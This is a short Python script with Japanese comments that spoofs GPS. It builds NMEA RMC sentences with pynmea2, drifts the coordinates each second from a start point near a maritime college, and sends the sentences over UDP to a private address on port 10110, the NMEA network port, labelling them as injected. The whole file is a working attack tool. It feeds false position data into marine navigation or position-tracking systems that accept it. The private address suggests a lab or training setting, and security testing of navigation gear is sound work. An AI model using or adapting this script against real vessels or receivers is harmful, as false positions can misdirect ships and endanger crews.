import socket
import time
import pynmea2
from datetime import datetime

# 宛先設定
TARGET_IP = "192.168.20.20"
TARGET_PORT = 10110

def generate_spoofed_gps():
    # 初期位置（例：広島商船高専付近）
    lat = 34.2250
    lon = 132.8660
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[*] Injecting spoofed GPS to {TARGET_IP}:{TARGET_PORT}")
    
    try:
        while True:
            # 座標を少しずつ更新
            lat += 0.0001
            lon += 0.0001
            
            # 時刻と日付を取得
            now = datetime.utcnow()
            timestamp = now.strftime('%H%M%S')
            datestamp = now.strftime('%d%m%y')

            # 座標をNMEA形式(DDMM.MMMM)に変換
            lat_deg = int(abs(lat))
            lat_min = (abs(lat) - lat_deg) * 60
            lat_nmea = f"{lat_deg:02d}{lat_min:07.4f}" # DDMM.MMMM
            lat_dir = 'N' if lat >= 0 else 'S'

            lon_deg = int(abs(lon))
            lon_min = (abs(lon) - lon_deg) * 60
            lon_nmea = f"{lon_deg:03d}{lon_min:07.4f}" # DDDMM.MMMM
            lon_nmea_str = f"{lon_nmea}" # pynmea2 expects string
            lon_dir = 'E' if lon >= 0 else 'W'

            # RMCセンテンスを正しく生成
            # パラメータ: talker, sentence_type, data (tuple)
            # data: [時刻, ステータス, 緯度, N/S, 経度, E/W, 速度, 方位, 日付, 磁気偏差, 偏差区分]
            msg = pynmea2.RMC('GP', 'RMC', (
                timestamp, 'A', 
                lat_nmea, lat_dir, lon_nmea, lon_dir, 
                '12.0', '45.0', datestamp, '', ''
            ))
            
            # str(msg) を呼び出した時点でチェックサムが自動付与されます
            packet = (str(msg) + '\r\n').encode('utf-8')
            sock.sendto(packet, (TARGET_IP, TARGET_PORT))
            
            print(f"[Injected] {msg}")
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] Stopping injection...")
    finally:
        sock.close()

if __name__ == "__main__":
    generate_spoofed_gps()